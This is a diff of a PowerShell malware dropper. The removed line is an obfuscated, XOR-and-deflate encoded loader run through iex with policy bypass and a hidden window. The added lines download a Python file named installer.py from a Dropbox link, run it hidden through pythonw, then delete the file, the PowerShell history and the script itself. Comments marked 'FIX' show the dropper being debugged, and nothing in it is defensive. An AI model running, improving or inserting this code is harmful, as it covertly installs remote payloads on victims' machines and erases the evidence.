@@ -1,1 +1,20 @@
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c "& { _hikfg7=''=4/H9O5BmnxAWyFyRRSQl1fPSLQPomEwcO0uJ3FyyXNX3TV6+BhmNJAct2p8J3FV3k6CBPDVBE855ZMxiC9Jzy1xCktCQOBfgBbCyrUDeWeDqgrHyXgaXax4E0+euieSBDE7XQos1N0auxFRVWJW8aaNwm4wXE1LFCd2sf3Y91J/TDxps/sXbXS+p2k4EQvyjWF3JLV1cZ3owmrxgHC0IcR0XP3Vp2UpcdlQCgD+QNNJADi+M05qFVE1fygSdot1ZiozDUH7zcBrVJjnLt8vPneXVDDPJJRjc2YpZwXgwaRXDi0INJVxrf7OqzLfi7T0iDfv2wBJsLM/yWq1pWUfIgcN+AUwOuHzTnfMHBX98d5R8SE6Dofj6ei+M7HRuy9abmpKAFXQD0e2GY4EG03OSF3V0+LJbn9LS/c+ksAmrBWcsHW06v0fJWPry7VrD/mnBxmqee3veTPyITIavE5okxwapajtnqplov/27vmwNmM3ZDMzBojT+Nl4oa6064wrWxELzqJ0ghHxNN6oMr2ir00rXZgkIr9n1chyfBQjtIesD1Ijjfiotu2weNVVMSj2/+5ygbd4xRl/rD4yHZobBooifv/chqpsP8WG+kPgiDKC1HERDLXHUBP6sKlcNxo+5uFY8e58/mca+PghpXkKeN2MUhXunaz9tlJlRhT3LM92pZnGV79TSCxasrf955QHI9m+GC3xtGGtWrq8HEA0PvYqILE5Vj2zPPglgNW7+EDl4CaZUy8n''; _ex38=''5xYZ9//TTwEqKLydvy2l16F9cecYBIBbMfTI4MLM''; _vqq16=[System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String(_hikfg7)) -split '''' -join '''' -split ''''[1..(_hikfg7.Length)] -join ''''); $decBytes=[System.Convert]::FromBase64String(_vqq16); $keyBytes=[System.Convert]::FromBase64String(_ex38); for($i=0;$i -lt $decBytes.Length;$i++){ $decBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length] }; $inflated=New-Object System.IO.MemoryStream; $deflate=New-Object System.IO.Compression.DeflateStream([System.IO.MemoryStream]::new($decBytes), [System.IO.Compression.CompressionMode]::Decompress); $deflate.CopyTo($inflated); $script=[System.Text.Encoding]::UTF8.GetString($inflated.ToArray()); iex $script }"
+$url = "https://dl.dropboxusercontent.com/scl/fi/tu8adsaq78omymdmv28k1/installer.py?rlkey=2ktj16qecla9xnkmgmtse5rkl&dl=1"
+$name = [System.IO.Path]::GetRandomFileName() -replace "\..*",""
+$temp = "$env:TEMP\$name.tmp"
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0")
+$wc.DownloadFile($url, $temp)
+
+# FIX 1: Add quotes around the argument
+Start-Process -WindowStyle Hidden -FilePath "pythonw.exe" -ArgumentList "`"$temp`""
+
+Start-Sleep -Seconds 5
+Remove-Item $temp -Force -ErrorAction SilentlyContinue
+Clear-History
+$hist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+Remove-Item $hist -Force -ErrorAction SilentlyContinue
+
+# FIX 2: Only delete if running as a script file
+if ($MyInvocation.MyCommand.Path) {
+    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
+}
